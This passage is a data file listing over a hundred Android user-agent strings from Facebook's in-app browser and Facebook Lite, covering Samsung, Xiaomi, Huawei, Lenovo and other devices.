"Mozilla/5.0 (Linux; Android 5.1.1; BLOW BlackTAB10 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/148.0.0.51.62;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo A6010 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; Mi A1 Build/OPR1.170623.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; K6000 Pro Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; MI 5 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; U; Android 4.1.2; uk-ua; GT-I8552 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 6.0; LENNY3 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/126.0.0.23.77;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-J510H Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A320F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; XtremePQ15 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 8.0.0; H4213 Build/50.1.A.5.59; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/87.0.0.7.184;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/161.0.0.35.93;]",
"Mozilla/5.0 (Linux; Android 5.1.1; A106T Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L11 Build/HUAWEICAN-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; HTC Desire 630 dual sim Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/160.0.0.28.92;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire 816 dual sim Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.68 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/124.0.0.22.66;]",
"Mozilla/5.0 (Linux; Android 6.0; S6S5IN3G Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/hu_HU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 8.0.0; MI 6 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-G361H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/77.0.0.20.66;]",
"Mozilla/5.0 (Linux; Android 6.0.1; CPH1613 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/160.0.0.28.92;]",
"Mozilla/5.0 (Linux; Android 6.0.1; MI 5s Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; MI 5 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/147.0.0.44.75;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/78.0.0.10.186;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo A6010 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SM-A300H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 4.4.4; MI PAD Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/88.0.0.6.182;]",
"Mozilla/5.0 (Linux; Android 5.1; m2 note Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Lenovo P1a42 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/87.0.0.7.184;]",
"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A328 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/84.0.0.16.184;]",
"Mozilla/5.0 (Linux; Android 4.4.2; HTC Desire 601 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 6.0; PRO 6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; PRO 6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/153.0.0.54.88;]",
"Mozilla/5.0 (Linux; Android 6.0; U10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.124 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/164.0.0.44.95;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LYO-L01 Build/HUAWEILYO-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T285 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo A5000 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 6.0; H60-L04 Build/HDH60-L04; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0.1; Lenovo TAB S8-50F Build/BMAIN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-U22 Build/HUAWEILUA-U22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 8.0.0; VTR-L29 Build/HUAWEIVTR-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/159.0.0.38.95;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/156.0.0.36.100;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/164.0.0.37.95;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J530F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.1; TA-1032 Build/NMF26O; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 6.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/hu_HU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/139.0.0.22.93;]",
"Mozilla/5.0 (Linux; Android 6.0; HTC One_M8 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.0.2; VK810 4G Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/155.0.0.36.96;]",
"Mozilla/5.0 (Linux; Android 5.0.1; LG-H950 Build/LRX21Y; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; EVA-L19 Build/HUAWEIEVA-L19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/166.0.0.66.95;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A320FL Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; BRAVIS X500 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-A530F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; Redmi Note 4 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; PAP5044DUO Build/PrestigioPAP5044DUO) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.15.182;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-N9200 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; BND-L21 Build/HONORBND-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G950F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; U7 Max Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/86.0.0.9.190;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-L01 Build/HUAWEITIT-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SGP511 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J330F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/166.0.0.66.95;]",
"Mozilla/5.0 (Linux; Android 5.1; M3s Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5010 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 8.1.0; ONEPLUS A5000 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; M5s Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 4.4.2; A 9+ Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/87.0.0.7.184;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1 Build/HUAWEIFIG-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.33.385;]",
"Mozilla/5.0 (Linux; Android 5.0.2; LG-D722 Build/LRX22G.A1442555223; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36[FBAN/EMA;FBLC/hu_HU;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 7.0; BV6000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A328 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-N935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]",
"Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; Lenovo P70-A Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/161.0.0.35.93;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-26-11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
